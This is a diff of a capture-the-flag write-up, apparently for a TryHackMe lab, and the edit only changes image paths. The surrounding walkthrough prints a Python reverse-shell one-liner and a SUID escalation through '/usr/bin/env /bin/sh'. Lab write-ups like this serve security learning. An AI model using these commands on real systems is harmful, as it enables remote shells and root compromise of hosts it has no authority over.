@@ -38,7 +38,7 @@ The scan revealed four open ports:
 - **139** (netbios-ssn)
 - **445** (microsoft-ds)
 
-![nmap](/assets/images/writeups/anonymous/1.png)
+![nmap](/assets/images/writeups/thm/anonymous/1.png)
 
 I decided to analyze the output of nmap maybe so that i might be lucky and find an exploitable service.
 
@@ -54,7 +54,7 @@ There wa NetBios/smb running so i tried to figure what shares are present where 
 ```bash
 smbclient -L <target-ip> -U <username>
 ```
-![smb](/assets/images/writeups/anonymous/2.png)
+![smb](/assets/images/writeups/thm/anonymous/2.png)
 
 There was open ports on port 21 where `FTP` service was running and allows `anonymous` user Login. So let's check out that.
 
@@ -63,11 +63,11 @@ ftp <target-ip>
 ```
 i had successfully logged in through FTP. Checking the directories with `ls` command there i saw `scripts` directory with `read/write/execute` permissions and found three files in the scripts folder, 
 
-![folder](/assets/images/writeups/anonymous/3.png)
+![folder](/assets/images/writeups/thm/anonymous/3.png)
 
 i downloaded them and reviewed their contents where i found the way to enter the system. 
 
-![content](/assets/images/writeups/anonymous/4.png)
+![content](/assets/images/writeups/thm/anonymous/4.png)
 
 ---
 
@@ -80,7 +80,7 @@ So, i was sure at that moment that this script is probably automatically ran by 
 ```bash
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<target-ip>",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 ```
-![folder](/assets/images/writeups/anonymous/5.png)
+![folder](/assets/images/writeups/thm/anonymous/5.png)
 
 ---
 
@@ -91,18 +91,18 @@ I tried running `sudo -l` but password was required which was not available till
 ```bash
 find / -type f -perm /4000 2>/dev/null
 ```
-![folder](/assets/images/writeups/anonymous/6.png)
+![folder](/assets/images/writeups/thm/anonymous/6.png)
 
 i had got the list of `SUID` files.
 
-![folder](/assets/images/writeups/anonymous/7.png)
+![folder](/assets/images/writeups/thm/anonymous/7.png)
 
 I did check on the [GTFObins](https://gtfobins.org/) website and after going through the list of identified binaries the only option that worked was `env` which then i exploited to bypass local security restrictions and got my root flag too.
 
 ```bash
 /usr/bin/env /bin/sh
 ```
-![folder](/assets/images/writeups/anonymous/8.png)
+![folder](/assets/images/writeups/thm/anonymous/8.png)
 
 ---
 
@@ -111,7 +111,7 @@ I did check on the [GTFObins](https://gtfobins.org/) website and after going thr
  - smbclient
  - netcat
   
-🖼️ **all process screenshot:** ![all process](/assets/images/writeups/anonymous/all_process.png)
+🖼️ **all process screenshot:** ![all process](/assets/images/writeups/thm/anonymous/all_process.png)
 
 
 *Thanks for reading!*
